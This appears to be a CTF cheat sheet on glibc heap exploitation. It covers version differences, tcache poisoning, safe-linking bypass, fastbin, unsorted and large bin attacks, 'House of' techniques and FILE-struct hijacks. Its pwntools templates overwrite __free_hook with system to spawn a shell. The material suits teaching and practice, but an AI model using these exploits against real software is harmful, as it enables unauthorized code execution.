# Heap Exploitation (Heap Pwn)

## glibc version differences (required reading)

Every heap exploitation technique is tightly bound to the glibc version. Confirm the version first:

```bash
./libc.so.6 | head -1
# GNU C Library (Ubuntu GLIBC 2.31-0ubuntu9.9) stable release version 2.31.

# Or strings
strings ./libc.so.6 | grep "GNU C Library"
```

| glibc version | Key change | Impact |
|-----------|---------|------|
| 2.26 and earlier | No tcache | unsorted/fastbin are the main battlefield |
| 2.27 | **tcache introduced** | tcache poisoning is extremely simple |
| 2.29 | unsorted bin unlink hardening (chunk size check) | unsorted bin attack cut off |
| 2.31 | Multiple tcache checks (key field) | tcache poisoning slightly harder |
| 2.32 | **safe-linking** (fd pointer XORed with PROTECT_PTR) | Heap base must be leaked first |
| 2.34 | **__free_hook / __malloc_hook removed** | Switch to FILE struct / exit handlers |
| 2.35+ | Further hardening | Same as 2.34, the FILE path still works |

## tcache poisoning (2.27 - 2.31)

### Principle

tcache is a per-thread cache with one singly linked list (fd only) per size class.
Before 2.29 the double free check only looked at whether the list head was the chunk itself, without walking the list.

### Exploitation template (2.27 - 2.31)

```python
from pwn import *

p = process('./vuln')
libc = ELF('./libc.so.6')

def add(idx, size, data=b'a'):
    p.sendlineafter(b'> ', b'1')
    p.sendlineafter(b'idx: ', str(idx).encode())
    p.sendlineafter(b'size: ', str(size).encode())
    p.sendafter(b'data: ', data)

def free(idx):
    p.sendlineafter(b'> ', b'2')
    p.sendlineafter(b'idx: ', str(idx).encode())

def show(idx):
    p.sendlineafter(b'> ', b'3')
    p.sendlineafter(b'idx: ', str(idx).encode())
    return p.recvline().strip()

# === Step 1: leak libc base ===
# Allocate a chunk larger than the tcache range (>0x408), free it into the unsorted bin, leaving a main_arena pointer behind
for i in range(8):
    add(i, 0x80)
add(8, 0x80)  # prevent coalescing
for i in range(7):
    free(i)
free(7)       # the 8th goes into the unsorted bin, fd/bk point to main_arena+96
add(9, 0x80)  # carve part of it back, keeping fd
leak = u64(show(9).ljust(8, b'\x00'))
libc.address = leak - 0x3ebca0  # main_arena+96 offset, glibc 2.27 amd64
log.success(f'libc = {hex(libc.address)}')

# === Step 2: tcache poisoning → write __free_hook ===
add(10, 0x30)
add(11, 0x30)
free(10)
free(11)
# Use the UAF to point chunk11's fd at __free_hook
edit(11, p64(libc.sym['__free_hook']))
add(12, 0x30)  # take chunk11 out
add(13, 0x30, p64(libc.sym['system']))  # what comes out is the __free_hook address; write system

# Trigger: free a chunk whose content is "/bin/sh\x00"
add(14, 0x30, b'/bin/sh\x00')
free(14)

p.interactive()
```

## safe-linking bypass (2.32+)

```text
Principle: tcache/fastbin fd values are XORed with PROTECT_PTR when written:
    PROTECT_PTR(pos, ptr) = (pos >> 12) ^ ptr

Bypass:
1. A heap address (heap base) must be leaked first
2. Compute the obfuscated value: fake_fd_obf = (chunk_addr >> 12) ^ target
3. Write it in
```

```python
def protect_ptr(pos, ptr):
    return (pos >> 12) ^ ptr

# Leak the heap base (unsorted bin leftovers / tcache fd leftovers)
heap_base = leaked_heap & ~0xfff

# poisoning
fake_fd = protect_ptr(heap_base + chunk_off, target_addr)
edit(chunk_id, p64(fake_fd))
```

## fastbin attack (traditional, mainly 2.26 and earlier)

```text
Key points:
1. fastbin is a singly linked list (fd only) without size checks, except that the chunk size must match
2. After 2.27 tcache comes first; fastbin is used only when tcache is full
3. You still need to forge memory that looks like a chunk (size field = real chunk size, give or take)
```

```python
# double free
add(0, 0x60)
add(1, 0x60)
free(0)
free(1)
free(0)  # fastbin: 0 → 1 → 0

# Point fd at the fake chunk (requires the size byte at fake_addr + 8 to match 0x70)
add(2, 0x60, p64(fake_addr))
add(3, 0x60)
add(4, 0x60)  # take out the chunk at fake_addr
```

## unsorted bin attack (2.28 and earlier only)

```text
Principle: writes main_arena+88 to an arbitrary address
From 2.29 a bck->fd == victim check was added, which cannot be bypassed
Use: overwrite global_max_fast so small chunks also go to fastbin → combine with a fastbin attack
```

```python
# Allocate an unsorted-size chunk
add(0, 0x100)
add(1, 0x100)  # prevent top consolidation
free(0)
# Use the UAF to change the bk pointer to target - 0x10
edit(0, p64(0) + p64(target - 0x10))
add(2, 0x100)  # take it out of unsorted → unlink → main_arena+88 is written to target
```

## large bin attack

```text
Principle: a large bin has an extra layer of fd_nextsize / bk_nextsize compared with unsorted
From 2.32 a chunk size check was also added, but it still works for overwriting global_max_fast, _IO_list_all and similar
Advanced technique, often used in combinations such as House of Husk
```

## House of XXX quick reference

| Name | Applicable versions | Core idea |
|------|---------|---------|
| House of Force | 2.28 and earlier | Set the top chunk size to a huge value → malloc at any address |
| House of Lore | All versions | Forge a small bin chain → return any address |
| House of Orange | 2.23-2.30 | unsorted attack overwrites _IO_list_all to trigger _IO_flush_all_lockp |
| House of Roman | 2.23-2.26 | 12-bit brute force + fastbin attack to __malloc_hook |
| House of Einherjar | All versions | Forge prev_size + PREV_INUSE=0 → backward consolidation |
| House of Botcake | 2.27+ | tcache + unsorted bin combination, bypasses the tcache double free check |
| House of Husk | 2.27+ | Overwrite printf's hook table (__printf_function_table) |
| House of Cat | 2.34+ | _IO_wfile_seekoff vtable exploitation, aimed at versions without hooks |
| House of Apple | 2.34+ | _IO_wfile_jumps + setcontext gadget |

## Real exploitation steps (general 4 steps)

```text
Step 1: leak heap base
  - Allocate a chunk → free it into tcache (2.32+ keeps the obfuscated fd) → show → derive the heap
  - Or: allocate a large chunk → free it into unsorted → carve it back → show fd

Step 2: leak libc base
  - A large chunk freed into the unsorted bin leaves the main_arena address in fd/bk
  - show → leak → libc.address = leak - main_arena_offset

Step 3: control IP
  - 2.27-2.33: tcache/fastbin poisoning → write __free_hook or __malloc_hook
  - 2.34+: FILE struct attack (_IO_2_1_stdout_ / stderr), change the vtable → _IO_wfile_jumps
  - Or: hijack exit handlers (__exit_funcs / tls_dtor_list)

Step 4: getshell
  - free_hook = system, free("/bin/sh") → shell
  - 2.34+: setcontext + 53 gadget → rop chain in heap → execve
```

## Alternative paths after libc 2.34+ removed the hooks

### FILE struct attack (_IO_2_1_stdout_ / _IO_2_1_stderr_)

```text
Goal: when the program calls puts/printf, it eventually reaches _IO_file_xsputn → _IO_OVERFLOW → a vtable call
Hijack:
  1. Overwrite the vtable pointer of _IO_2_1_stderr_ to point at a forged vtable
  2. Forge the vtable so the __overflow field points at system or setcontext
  3. Make the first 8 bytes of fp (FILE*) itself "/bin/sh\x00" (as system's rdi)
Trigger: any puts/printf/abort/exit flushes stderr
```

### Exit handlers (`__exit_funcs` / `tls_dtor_list`)

```text
Principle: __run_exit_handlers walks the __exit_funcs list and calls each dtor
Hijack: change a list node's func pointer to system and arg to "/bin/sh"
Note: 2.34+ added PTR_DEMANGLE; the fs:[0x30] guard value in tls must be leaked to forge it
```

### tls_dtor_list (more modern)

```text
__call_tls_dtors walks it; the structure is similar and PTR_DEMANGLE must also be bypassed
Applies: runs when the program exits, more general than the FILE attack
```

## pwndbg / GEF heap debugging commands

```text
# pwndbg
heap              # show every chunk of the current arena
bins              # show the tcache / fastbin / unsorted / small / large bins
tcache            # look at tcache alone
find_fake_fast <addr> <size>  # find an fd write point usable as a fake chunk
vis_heap_chunks   # visualize the heap layout

# GEF
heap chunks
heap bins fast
heap bins tcache
heap chunk <addr>
```

## Typical pwntools template (heap menu challenges)

```python
from pwn import *

context.binary = elf = ELF('./vuln')
libc = ELF('./libc.so.6')

p = process('./vuln') if not args.REMOTE else remote('host', 1337)

# IO wrappers
def menu(choice):
    p.sendlineafter(b'choice:', str(choice).encode())

def add(idx, size, data=b'\n'):
    menu(1)
    p.sendlineafter(b'idx:', str(idx).encode())
    p.sendlineafter(b'size:', str(size).encode())
    if data != b'\n':
        p.sendafter(b'data:', data)

def free(idx):
    menu(2)
    p.sendlineafter(b'idx:', str(idx).encode())

def show(idx):
    menu(3)
    p.sendlineafter(b'idx:', str(idx).encode())
    return p.recvline().strip()

def edit(idx, data):
    menu(4)
    p.sendlineafter(b'idx:', str(idx).encode())
    p.sendafter(b'data:', data)

# === Choose the technique stack later by vulnerability type ===
```

## Notes

- **The glibc version is the first-order question**: the same binary with a 2.27 libc and a 2.34 libc has completely different exploitation paths
- **tcache capacity = 7** (per size class): spray 7 before anything overflows into unsorted/fastbin
- **chunk size = user request + 0x10 header, aligned to 0x10** (excluding the 0x10 header, you can actually write 0x8 beyond it because the next chunk's prev_size is reused)
- **Remote heap sprays are unstable**: in a fork-per-connection server model brk/mmap may differ per connection; test with randomization
- **Do not leave unsorted leftovers in the attack chain**: a main_arena pointer in an unexpected chunk scrambles later show output
- **safe-linking error rate**: when computing PROTECT_PTR remember it is `pos >> 12`, where pos is the address being written to, not the address being pointed to
